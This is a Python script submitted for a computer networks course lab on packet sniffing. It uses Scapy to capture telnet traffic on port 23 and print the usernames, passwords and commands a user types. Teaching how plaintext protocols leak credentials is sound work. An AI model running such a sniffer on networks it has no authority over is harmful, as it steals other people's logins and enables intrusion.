#!/usr/bin/env python3
# ==============================================================================
# File Name:     telnet_sniffer.py
# Author:        Eva Tate and Giselle Wu
# Course:        CS60: Computer Networks
# Assignment:    Lab 1: Packet sniffing and spoofing
# Date:          September 29, 2026
#
# Description:   Implements the telnet password sniffer described in
#                Lab 1, Exercise 3.
#
# ==============================================================================

"""Telnet keystroke sniffer using Scapy.

Sniffs TCP port 23 traffic and prints each keystroke exactly once as the
user types it (username, password, and any shell commands), ignoring the
packets in which the remote host echoes the keystroke back.

Usage: sudo python3 telnet_sniffer.py [interface]
"""

import sys

from scapy.layers.inet import TCP
from scapy.packet import Raw
from scapy.sendrecv import sniff

TELNET_PORT = 23
TELNET_IAC = 0xFF  # marks option-negotiation data (terminal type, window size, ...)
PRINTABLE = set(range(0x20, 0x7F))  # visible ASCII only; CR/LF handled separately below

# Telnet's "Enter" is CR followed by a padding NUL or LF (CR NUL / CR LF).
# Tracks whether the previous byte was a CR, so that pairing byte can be
# swallowed instead of producing a second blank line.
_after_cr = False


def handle_packet(pkt):
    global _after_cr

    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    # Only look at packets heading TO port 23 (client -> server). These are
    # the characters the user actually typed. Packets FROM port 23
    # (server -> client, sport == 23) are the server echoing the keystroke
    # back to the terminal, and are skipped so each character is printed once.
    if pkt[TCP].dport != TELNET_PORT:
        return

    data = pkt[Raw].load

    # Telnet option negotiation (IAC DO/WILL/SB ... SE) is not a keystroke,
    # even though the embedded option text (e.g. a terminal type or speed
    # string) is itself printable. Drop the whole packet if it contains IAC.
    if TELNET_IAC in data:
        return

    for byte in data:
        if _after_cr and byte in (0x00, 0x0A):
            # Second half of a CR-NUL / CR-LF "Enter" pair; already handled.
            _after_cr = False
            continue
        _after_cr = False

        if byte == 0x0D:
            # A bare '\r' would just return the cursor to the start of the
            # current line, so the next word (e.g. the password) overwrites
            # the previous one (e.g. the username) on screen. Print a real
            # newline instead so each line the user typed stays visible.
            sys.stdout.write("\n")
            _after_cr = True
        elif byte == 0x0A:
            sys.stdout.write("\n")
        elif byte in PRINTABLE:
            sys.stdout.write(chr(byte))
    sys.stdout.flush()


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else None
    print(f"Sniffing telnet traffic on {iface or 'default interface'} (Ctrl+C to stop)...")
    sniff(filter=f"tcp port {TELNET_PORT}", iface=iface, prn=handle_packet, store=False)


if __name__ == "__main__":
    main()
